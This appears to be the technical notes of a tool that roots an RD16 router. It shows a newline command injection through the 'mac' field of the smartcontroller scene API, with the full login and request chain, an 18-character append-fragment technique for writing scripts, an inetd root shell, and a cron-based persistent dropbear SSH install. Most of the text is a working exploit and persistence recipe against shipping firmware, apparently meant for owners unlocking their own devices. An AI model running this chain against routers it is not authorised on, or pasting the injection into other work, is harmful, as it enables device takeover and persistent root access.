# Technical details

## Injection point

`/usr/sbin/smartcontroller` splices `mac` and `wan` from the action payload (a JSON string) straight into:

```
snprintf(buf, "… set mac=%s wan=%s;/usr/sbin/sysapi macfilter commit", mac, wan)
system(buf)
```

No escaping on `mac` → newline = command injection. The fortify `snprintf` bound leaves ≈18 characters of usable command after the fixed template text.

## Call chain

```
POST /cgi-bin/luci/api/xqsystem/login        -> token
POST /cgi-bin/luci/;stok=$TOK/api/xqsmarthome/request_smartcontroller
    {"command":"scene_setting","id":0,"launch":{"mode":"home"},
     "action_list":[{"thirdParty":"xmrouter","type":"wan_block","delay":0,
                     "payload":"{\"command\":\"wan_block\",\"mac\":\"AA\n<CMD>\n\"}"}]}
    -> daemon stores the scene, returns id
POST same endpoint {"command":"scene_start","id":<id>} -> executes
```

`payload` is a **string-typed** inner JSON object (double-escaped). The login body is form-encoded field by field so `&` / `+` in the password survive.

## Why bare telnetd fails

busybox carries `bdata get telnet_en` / `nvram get telnet_en` checks — `telnetd` exits immediately and never binds. The official `set_telnet` API is gated behind the `apps.telnet` feature flag (not registered on release builds). inetd skips the check and hands out `/bin/sh` — but it is a **debug-only** channel and is removed once SSH is up (below).

## Append-fragment writer

Every injected command is ≤18 chars and appends straight to the target file — unbounded script length, and no assembly step that could overflow:

- non-space frag (≤2 chars): `echo -n FF>>/tmp/x` (18)
- 3-char group containing a space `A B`: `echo -n A B>/tmp/0` + `cat /tmp/0>>/tmp/x` (two cmds, 18 each) — the space comes from echo's argv splitting
- line-final frag: plain `echo` (`echo A D >>/tmp/x`, 17-18) supplying the newline
- all-digit args directly before `>`/`>>` parse as fd redirection (`2>`, `2>>`) — pad with `D >>`; mixed args (`aa2`) are immune because io_number only matches whole-word digits
- `space+digit` (`A D`) mid-line has no legal ≤18-char emission — the writer raises `ValueError`; `>` can never appear inside content

`run_cmd()` hard-checks every command for length and banned characters.

## SSH verification

A banner or listening port only proves something answered — not that pubkey login works. With `--privkey`, the tool runs a real `ssh -i <key> -o BatchMode=yes root@ip id` and requires `uid=0`; without it, interactive confirmation gates the inetd teardown. On failure :23 stays up.

## Firewall (--allow-cidr)

Dedicated chain `RD16_SSH` (`-N` create, `-F` flush, `ACCEPT <cidr>` → `DROP`), plus an `-I` jump rule pinned to the top of INPUT — :22 traffic always traverses our chain first regardless of earlier generic ACCEPTs. The CIDR is validated by `ipaddress.ip_network` before reaching the script; without the flag nothing is installed.

## Persistence model

- `/etc` = ramfs, rebuilt from squashfs at boot → runtime writes die
- `/etc/crontabs`, `/etc/config` = bind mounts onto `/dev/mapper/sec_cfg` (ext4) → persistent
- `/data` (UBIFS) → persistent; hosts the host key, `persist.sh`, `authorized_keys`
- `* * * * * sh /data/persist.sh` in `/etc/crontabs/root` self-heals within a minute of every boot
- persist.sh resurrects **dropbear only** — inetd never goes into the watchdog or onto /data

## Dropbear (key auth only)

1. `rm /etc/dropbear/dropbear_rsa_host_key` (must delete the 0-byte placeholder first — `dropbearkey` refuses `File exists`)
2. `dropbearkey -t rsa -f /data/dropbear_rsa_host_key` (~1 min — RSA-2048 is slow on this SoC)
3. `dropbear -s -r /data/dropbear_rsa_host_key` → key auth only; **no `-B`** (blank passwords) and no password logins
4. `authorized_keys` lives at `/etc/dropbear/authorized_keys` (runtime-effective; persist.sh restores it)
5. Cleanup: `kill` every `pgrep -x inetd` pid + `rm /etc/inetd.conf` — only after `ssh -i <key> root@<ip> id` returns `uid=0` (a banner alone is not verification)

## Dead ends / unverified

- `nvram set telnet_en=1` / `bdata set telnet_en=1`: commands ran but `nvram show`/`bdata show` still empty — the nvram backend seems inert in lanap mode; not needed for the inetd route
- All XMiR-Patcher LuCI injection points (arn_switch/start_binding/set_mac_filter/datacenter7/Smartcontroller legacy paths/get_icon): fully patched in 1.0.41
- `set_macfilter_rules` / `set_global_enable`: no matching API route registered on RD16
- `openssl` exists on the device (`openssl passwd -1`, `enc -d -base64 -in/-out`) — usable for arbitrary binary writes (alternate dropbear hostkey path)
